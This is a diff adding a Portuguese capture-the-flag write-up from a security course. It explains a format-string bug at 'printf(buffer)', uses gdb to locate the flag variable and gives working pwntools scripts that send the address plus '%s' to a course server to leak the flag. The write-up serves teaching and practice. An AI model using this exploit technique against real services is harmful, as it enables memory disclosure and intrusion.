@@ -262,3 +262,120 @@ Com isto, conseguimos alterar o valor da variável target para 0x5000, como se p
 
 ![targetOutput2](uploads/logbook7P7.png)
 
+# LOGBOOK7 - CTF
+## Desaio 1
+
+
+>Análise do 'checksec'
+
+![checksec](uploads/logbook7P8.png)
+
+- Partial RELRO: Isto significa que certas secções podem ser alteradas, mas apenas para apontar para uma localização de memória que já esteja protegida. Assim, não é possível alterar o endereço de uma função para uma localização de memória que não esteja protegida.
+
+- Canary Found: Esta medida de segurança implica a presença de um "canário" (variável de controlo do fluxo) inserido na stack antes do endereço de retorno de uma função. Se essa variável for modificada, o programa será encerrado como uma medida de segurança contra tentativas de 'buffer overflow'.
+
+- NX Enabled: Esta medida de segurança marca certas áreas de memória como não executáveis, o que impede que código malicioso seja executado a partir dessas áreas.
+
+- No PIE: Considerado que o PIE está desativado, o endereço de memória das funções não é aleatório, o que facilita a exploração de vulnerabilidades.
+
+- Tipos de ataques possíveis:
+  - Format String Attack;
+
+<br>
+
+
+<div align="justify">
+
+>Qual é a linha do código onde a vulnerabilidade se encontra?
+<p>
+A vulnerabilidade encontra-se na linha 25 quando se executa 'printf(buffer)'. Quando se passa informação diretamente para o 'printf()' sem utilizar uma 'format string', é possível utilizar 'format specifiers' como %s e %x para ler ou escrever em localizações de memória.
+</p>
+
+>O que é que a vulnerabilidade permite fazer?
+<p>
+A vulnerabilidade permite ler e escrever em localizações de memória, o que pode ser utilizado para alterar o valor de variáveis, potencialmente alterando o comportamento do programa.
+</p>
+
+>Qual é a funcionalidade que te permite obter a flag?
+<p>
+De forma a obter a flag, podemos utilizar os 'format specifiers' mencionados na primeira questão de forma a conseguirmos ler o conteúdo da variável 'flag' e imprimi-lo.
+</p>
+
+>Obtenção da flag
+<p>
+De forma a obtermos a flag, pensamos primeiramente em encontrar o endereço da variável 'flag'. Para tal, corremos o programa com o gdb. Assim, conseguimos encontrar o endereço da variável 'flag' que é: 0x804c060.
+</p>
+
+```bash
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
+Reading symbols from program...
+(gdb) b fflush
+Breakpoint 1 at 0x80490d0
+(gdb) run
+Starting program:FSI/Semana7-Desafio1/program
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Try to unlock the flag.
+
+Breakpoint 1, 0xf7df8a58 in fflush () from /lib32/libc.so.6
+(gdb) p &flag
+$1 = (char (*)[40]) 0x804c060 <flag>
+(gdb)
+```
+
+<p>
+Após isso decidimos decidimos verificar quantos '%x' precisariamos de utilizar para encontrarmos o conteúdo do nosso input. Para tal, colocamos como input '0000' e aquando a execução do script deveriamos procurar pelo valor '0x30303030'. Assim, o nosso script foi o seguinte: </p>
+
+```python
+from pwn import *
+
+LOCAL = True
+
+if LOCAL:
+    p = process("./program")
+    pause()
+else:
+    p = remote("ctf-fsi.fe.up.pt", 4004)
+
+p.recvuntil(b"got:")
+p.sendline(b"0000" + b"%.8x"*10)
+p.interactive()
+```
+
+<p>
+Após a execução do script, conseguimos encontrar o valor '0x30303030' na posição 1.
+</p>
+
+![Alt text](uploads/logbook7P9.png)
+
+<p>
+Assim, conseguimos concluir que para obter a flag precisamo de colococar no nosso input, o endereço da variável 'flag' seguido de 1 '%s' para conseguir ler o seu conteúdo. Assim, o nosso script foi o seguinte:
+</p>
+</div>
+
+```python
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    pause()
+else:
+    p = remote("ctf-fsi.fe.up.pt", 4004)
+
+input_address = 0x804c060
+address_bytes = input_address.to_bytes(4,byteorder='little')
+
+
+p.recvuntil(b"got:")
+p.sendline(address_bytes + b"%s")
+p.interactive()
+```
+
+<p>
+Executando o script, conseguimos obter a flag:
+</p>
+
+![Flag](uploads/logbook7P10.png)
+
